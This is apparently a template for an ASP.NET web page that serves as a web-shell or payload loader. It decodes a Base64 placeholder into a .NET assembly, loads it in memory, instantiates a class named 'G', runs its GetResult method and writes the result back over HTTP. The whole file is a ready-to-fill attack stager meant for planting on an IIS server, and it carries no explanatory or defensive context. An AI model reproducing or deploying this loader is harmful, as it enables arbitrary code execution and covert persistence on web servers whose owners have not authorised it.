<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime" %>
<%@ Import Namespace="System.Reflection" %>
<%object obj = System.Reflection.Assembly.Load(Convert.FromBase64String("%%base64%%")).CreateInstance("G");
Response.Write(obj.GetType().GetMethod("GetResult").Invoke(obj.GetType().GetConstructor(Type.EmptyTypes).Invoke(new object[]{}), new object[]{}));
%>